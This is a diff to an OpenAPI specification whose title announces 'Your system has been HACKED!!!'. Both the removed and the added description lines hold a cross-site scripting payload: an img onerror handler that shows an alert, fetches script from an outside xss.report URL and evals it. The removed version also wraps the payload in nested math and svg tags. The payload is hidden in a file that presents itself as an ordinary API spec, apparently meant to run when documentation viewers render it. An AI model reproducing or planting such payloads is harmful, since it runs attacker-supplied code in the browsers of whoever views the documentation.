@@ -1,6 +1,6 @@
 openapi: 3.0.0
 info:
   title: Your system has been HACKED!!!
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><a title='<img onerror=alert("Pak Tiko was here!!!");fetch("https://xss.report/c/santiko86").then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1><h1>test</h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <img onerror=alert("Pak Tiko was here!!!");fetch("https://xss.report/c/santiko86").then(function(res){res.text().then(function(data){eval(data)})})>
   version: 0.1.9
 
